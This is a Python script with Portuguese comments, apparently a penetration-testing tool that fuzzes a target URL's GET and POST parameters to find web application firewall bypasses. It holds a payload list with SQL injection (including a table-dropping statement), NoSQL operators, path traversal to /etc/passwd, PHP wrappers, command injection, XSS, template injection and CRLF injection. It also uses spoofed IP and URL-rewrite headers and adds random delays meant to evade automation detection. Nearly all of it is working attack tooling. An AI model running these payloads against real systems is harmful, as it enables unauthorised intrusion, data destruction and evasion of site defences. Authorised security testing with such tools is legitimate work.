#!/usr/bin/env python3
# Declarar args como variável global
args = None

import requests
import concurrent.futures
from colorama import Fore, Style, init
import time
import random
import difflib

# Inicializar colorama
init(autoreset=True)

# Lista de parâmetros mais comuns em aplicações web
parameters = [
    # Autenticação básica
    "username", "user", "email", "mail", "login", "id", "userid", "user_id",
    "password", "pass", "pwd", "passwd", "secret", "token", "key", "apikey", "api_key",
    
    # Autenticação OAuth/SSO
    "access_token", "auth", "oauth", "code", "state", "client_id", "redirect_uri",
    "response_type", "scope", "grant_type", "refresh_token", "id_token",
    
    # Admin/Privilégios
    "admin", "administrator", "isadmin", "is_admin", "superuser", "super", "root",
    "role", "level", "group", "usergroup", "permissions", "priv", "access",
    
    # Java-specific
    "j_username", "j_password", "jsessionid", "viewstate", "viewstateuserkey",
    "__VIEWSTATE", "__EVENTTARGET", "__EVENTARGUMENT", "javax.faces.ViewState",
    
    # Configuração/Debug
    "debug", "test", "mode", "config", "setting", "cfg", "env", "environment",
    "develop", "dev", "sandbox", "safe", "verbose", "trace", "profile",
    
    # Navegação/Redirecionamento
    "url", "redirect", "return", "returnurl", "return_url", "redirect_to", "goto",
    "next", "target", "destination", "continue", "success", "error", "cancel",
    
    # Sessão
    "session", "sessionid", "sid", "s", "token", "xsrf", "csrf", "nonce",
    
    # Operações
    "action", "do", "event", "op", "operation", "process", "exec", "cmd", "command",
    "func", "function", "method", "callback", "act", "run",
    
    # Filtros/Ordenação
    "q", "query", "search", "keyword", "filter", "sort", "order", "direction",
    "limit", "offset", "page", "start", "size", "count", "num",
    
    # Arquivos/Uploads
    "file", "upload", "document", "name", "filename", "path", "folder", "dir",
    "download", "attachment", "type", "format", "extension",
    
    # Formato de saída
    "output", "format", "view", "display", "layout", "template", "theme", "skin",
    "style", "json", "xml", "html", "text", "csv", "pdf", "raw",
    
    # Outras comuns
    "lang", "language", "locale", "region", "timezone", "date", "time",
    "version", "ver", "v", "ref", "source", "src", "origin", "from", "to",
    "callback", "jsonp", "ajax", "xhr", "async", "nocache", "rand", "hash"
]

# Payloads para bypass de WAF
payloads = [
    # Valores simples/booleanos
    "1", "0", "true", "false", "yes", "no", "on", "off",
    
    # Bypass básicos
    "admin", "root", "test", "guest", "demo",
    "%00admin",                   # Null byte
    "a%64min",                    # URL encoding parcial
    "%u0061dmin",                 # Unicode
    "ad\tmin",                    # Tab no meio
    "ad\nmin",                    # Newline no meio
    "a\u200Cdmin",                # Zero-width non-joiner (invisível)
    "admi\u00ADn",                # Soft hyphen (invisível)
    
    # SQL Injection
    "' OR 1=1--",                 # SQLi clássico
    "' OR '1'='1",                # SQLi alternativo
    "1' OR '1'='1",               # SQLi com prefixo numérico
    "1 OR 1=1",                   # SQLi sem aspas
    "'; DROP TABLE users; --",    # SQLi destrutivo
    "' UNION SELECT 1,2,3--",     # SQLi union
    "admin'--",                   # Comentário SQLi básico
    "admin' #",                   # Hash comment
    "admin/**/",                  # Comentário multi-linha
    
    # NoSQL Injection
    '{"$ne": null}',              # NoSQL não igual
    '{"$gt": ""}',                # NoSQL maior que
    '{"$regex": ".*"}',           # NoSQL regex
    
    # Path Traversal
    "../",                        # Path traversal básico
    "../etc/passwd",              # Path traversal *nix
    "..\\windows\\win.ini",      # Path traversal Windows
    "....//....//etc/passwd",    # Path traversal ofuscado
    
    # LFI/RFI
    "file:///etc/passwd",         # LFI básico
    "http://localhost/admin",     # SSRF/RFI básico
    "php://filter/convert.base64-encode/resource=index.php", # PHP wrapper
    "data:text/plain;base64,SSBhbSBhIHJlbW90ZSBmaWxl",      # Data URI
    
    # Command Injection
    "$(id)",                      # Command substitution
    "`id`",                       # Backtick
    "| id",                       # Pipe
    "; id",                       # Semicolon
    "&& id",                      # AND
    "|| id",                      # OR
    
    # XSS/Template Injection
    "<script>alert(1)</script>",  # XSS básico
    "{{7*7}}",                    # Template injection
    "${7*7}",                     # SSTI
    "#{7*7}",                     # Expression Language
    
    # Java específico
    "${applicationScope}",        # EL para JSP/JSF
    "#{facesContext}",            # EL para JSF
    "${cookie['JSESSIONID']}",    # EL para cookies
    
    # Header/Request Smuggling
    "%0d%0aSet-Cookie: hacked=1", # CRLF Injection
    
    # Valores extremos
    "a" * 1000,                   # String longa
    "-1",                         # Valor negativo
    "99999999999999999",          # Valor grande
    "\x00",                       # Null byte
    
    # Caracteres especiais
    "admin!@#$",                  # Caracteres especiais
    "admin;",                     # Ponto e vírgula
    "?debug=true",                # Query dentro de valor
    
    # Diversos
    "admin' OR 1 LIKE 1",         # SQLi alternativo (LIKE)
    "X-Forwarded-For: 127.0.0.1", # Header injetado
    "*",                          # Wildcard
    "%",                          # Wildcard SQL
    "\\"                          # Backslash (escape)
]

# Headers para tentar bypass
headers_list = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Referer": "https://admin.example.com/"},
    {"Origin": "https://admin.example.com"},
    {"X-Host": "admin.example.com"},
    {}  # Sem headers personalizados
]

# Função para obter uma linha de resposta normal da aplicação
def get_baseline_response(url):
    try:
        response = requests.get(url, verify=False, timeout=5)
        return response.text
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao obter resposta base: {str(e)}")
        return ""

# Função para verificar se a resposta difere significativamente da linha de base
def is_interesting_response(response_text, baseline_text, threshold=0.8):
    # Se contém mensagem de bloqueio, não é interessante
    if "Sorry, you have been blocked" in response_text:
        return False
        
    # Calcular similaridade entre as respostas
    similarity = difflib.SequenceMatcher(None, response_text, baseline_text).ratio()
    
    # Se a similaridade é menor que o limiar, é uma resposta interessante
    return similarity < threshold

def test_parameter(url, param, payload, headers, baseline_text, timeout=5):
    """Testa um parâmetro específico com um payload para identificar bypass de WAF"""
    try:
        # Usar um atraso aleatório para evitar detecção de automação
        time.sleep(random.uniform(0.1, 0.5))
        
        # Formar os parâmetros GET
        params = {param: payload}
        
        # Enviar a requisição GET
        response = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False)
        
        # Verificar se a resposta é interessante
        interesting = is_interesting_response(response.text, baseline_text)
        
        # Se não for 403 (bloqueado pelo WAF) e for interessante, retornar o resultado
        if response.status_code != 403 and interesting:
            return {
                "parameter": param,
                "payload": payload,
                "headers": headers,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_snippet": response.text[:100].strip(),
                "interesting": True
            }
    except Exception as e:
        return {
            "parameter": param,
            "payload": payload,
            "headers": headers,
            "status_code": "ERROR",
            "error": str(e),
            "interesting": True  # Erros são sempre interessantes
        }
    
    return None

def test_post_parameter(url, param, payload, headers, baseline_text, timeout=5):
    """Testa um parâmetro específico com um payload via POST para identificar bypass de WAF"""
    try:
        # Usar um atraso aleatório para evitar detecção de automação
        time.sleep(random.uniform(0.1, 0.5))
        
        # Formar os dados POST
        data = {param: payload}
        
        # Enviar a requisição POST
        response = requests.post(url, data=data, headers=headers, timeout=timeout, verify=False)
        
        # Verificar se a resposta é interessante
        interesting = is_interesting_response(response.text, baseline_text)
        
        # Se não for 403 (bloqueado pelo WAF) e for interessante, retornar o resultado
        if response.status_code != 403 and interesting:
            return {
                "parameter": param,
                "payload": payload,
                "headers": headers,
                "method": "POST",
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_snippet": response.text[:100].strip(),
                "interesting": True
            }
    except Exception as e:
        return {
            "parameter": param,
            "payload": payload,
            "headers": headers,
            "method": "POST",
            "status_code": "ERROR",
            "error": str(e),
            "interesting": True  # Erros são sempre interessantes
        }
    
    return None

def print_results(results):
    """Imprime um resumo dos resultados encontrados"""
    if not results:
        print(f"{Fore.RED}[-] Nenhum resultado encontrado.")
        return
        
    print(f"\n{Fore.GREEN}[+] Encontrados {len(results)} possíveis bypass de WAF!")
    
    # Agrupar por código de status para análise
    grouped_by_status = {}
    for test in results:
        status = test["status_code"]
        if status not in grouped_by_status:
            grouped_by_status[status] = []
        grouped_by_status[status].append(test)
    
    # Mostrar resultados agrupados por status
    for status, tests in grouped_by_status.items():
        print(f"\n{Fore.YELLOW}[*] Status {status}: {len(tests)} resultados")
        for test in tests[:5]:  # Limitar a 5 exemplos por status
            param = test["parameter"]
            payload = test["payload"]
            method = test.get("method", "GET")
            print(f"   {method} {param}={payload}")
            if "response_snippet" in test:
                print(f"   Resposta: {test['response_snippet']}")
    
    # Se um arquivo de saída foi especificado, salvar os resultados
    if args.output:
        try:
            with open(args.output, 'w') as f:
                for result in results:
                    f.write(f"Parameter: {result['parameter']}\n")
                    f.write(f"Payload: {result['payload']}\n")
                    f.write(f"Method: {result.get('method', 'GET')}\n")
                    f.write(f"Status: {result['status_code']}\n")
                    if "response_snippet" in result:
                        f.write(f"Response: {result['response_snippet']}\n")
                    f.write("-" * 80 + "\n")
            print(f"{Fore.GREEN}[+] Resultados salvos em {args.output}")
        except Exception as e:
            print(f"{Fore.RED}[!] Erro ao salvar resultados: {str(e)}")

def main():
    # Configurar argparse para receber a URL como argumento
    import argparse
    parser = argparse.ArgumentParser(description='Testador de bypass de WAF para aplicações web')
    parser.add_argument('url', help='URL completa do endpoint a ser testado (ex: https://example.com/login.jsp)')
    parser.add_argument('--threads', type=int, default=5, help='Número de threads para execução paralela (padrão: 5)')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout para requisições em segundos (padrão: 5)')
    parser.add_argument('--quick', action='store_true', help='Executar apenas testes rápidos com parâmetros comuns')
    parser.add_argument('--output', help='Arquivo para salvar os resultados')
    
    global args
    args = parser.parse_args()
    
    url = args.url
    
    print(f"{Fore.CYAN}[*] Iniciando testes de bypass de WAF em {url}")
    
    # Obter a resposta de linha base para comparação
    print(f"{Fore.CYAN}[*] Obtendo resposta base para comparação...")
    baseline_text = get_baseline_response(url)
    print(f"{Fore.CYAN}[*] Resposta base obtida: {len(baseline_text)} bytes")
    
    print(f"{Fore.CYAN}[*] Testando {len(parameters)} parâmetros com {len(payloads)} payloads")
    
    # Desativar os avisos de SSL não verificado
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    
    successful_tests = []
    
    # Testar alguns parâmetros comuns com poucos payloads primeiro para economizar tempo
    common_params = ["username", "user", "password", "admin", "debug", "token", "session", "j_username", "auth", "cmd", "api_key"]
    common_payloads = ["true", "1", "admin", "' OR '1'='1"]
    
    print(f"{Fore.CYAN}[*] Testando parâmetros comuns primeiro...")
    
    # Testar parâmetros comuns
    for param in common_params:
        for payload in common_payloads:
            for headers in headers_list[:3]:  # Usar apenas os primeiros 3 conjuntos de headers
                result = test_parameter(url, param, payload, headers, baseline_text, args.timeout)
                if result and result.get("interesting", False):
                    successful_tests.append(result)
                    print(f"{Fore.GREEN}[+] SUCESSO RÁPIDO! GET {param}={payload} | Status: {result['status_code']}")
                    print(f"   Resposta: {result.get('response_snippet', 'N/A')}")
                    print("-" * 80)
                
                result = test_post_parameter(url, param, payload, headers, baseline_text, args.timeout)
                if result and result.get("interesting", False):
                    successful_tests.append(result)
                    print(f"{Fore.GREEN}[+] SUCESSO RÁPIDO! POST {param}={payload} | Status: {result['status_code']}")
                    print(f"   Resposta: {result.get('response_snippet', 'N/A')}")
                    print("-" * 80)
    
    # Se já encontramos resultados interessantes, podemos pular o teste completo
    if successful_tests and not args.quick:
        print(f"{Fore.YELLOW}[*] Encontrados {len(successful_tests)} possíveis bypasses nos testes rápidos!")
        print(f"{Fore.YELLOW}[*] Deseja continuar com os testes completos? (s/n)")
        choice = input().lower()
        if choice != 's':
            print(f"{Fore.CYAN}[*] Mostrando resultados encontrados...")
            print_results(successful_tests)
            return
    elif args.quick and successful_tests:
        print(f"{Fore.CYAN}[*] Modo rápido ativado. Mostrando apenas resultados dos testes rápidos.")
        print_results(successful_tests)
        return
    elif args.quick and not successful_tests:
        print(f"{Fore.RED}[-] Modo rápido ativado, mas nenhum bypass encontrado nos testes rápidos.")
        return
    
    # Configurar um ThreadPoolExecutor para executar testes em paralelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        
        # Criar tarefas para cada combinação de parâmetro, payload e headers
        for param in parameters:
            # Pular parâmetros já testados
            if param in common_params:
                continue
                
            for payload in payloads:
                # Escolher apenas 3 conjuntos de headers aleatórios para reduzir o número de testes
                random_headers = random.sample(headers_list, min(3, len(headers_list)))
                for headers in random_headers:
                    # Adicionar testes GET
                    futures.append(executor.submit(test_parameter, url, param, payload, headers, baseline_text, args.timeout))
                    
                    # Adicionar testes POST
                    futures.append(executor.submit(test_post_parameter, url, param, payload, headers, baseline_text, args.timeout))
        
        # Coletar resultados à medida que são concluídos
        total_tests = len(futures)
        completed = 0
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            completed += 1
            
            # Mostrar progresso a cada 50 testes
            if completed % 50 == 0:
                print(f"{Fore.CYAN}[*] Progresso: {completed}/{total_tests} testes completados")
            
            if result and result.get("interesting", False):
                # Se encontrarmos um resultado interessante, adicionamos à lista de sucesso
                successful_tests.append(result)
                
                # Imprimir em verde os testes bem-sucedidos
                status = result["status_code"]
                param = result["parameter"]
                payload = result["payload"]
                method = result.get("method", "GET")
                
                print(f"{Fore.GREEN}[+] SUCESSO! {method} {param}={payload} | Status: {status}")
                print(f"   Resposta: {result.get('response_snippet', 'N/A')}")
                print("-" * 80)
    
    # Imprimir resumo
    print_results(successful_tests)

if __name__ == "__main__":
    main()
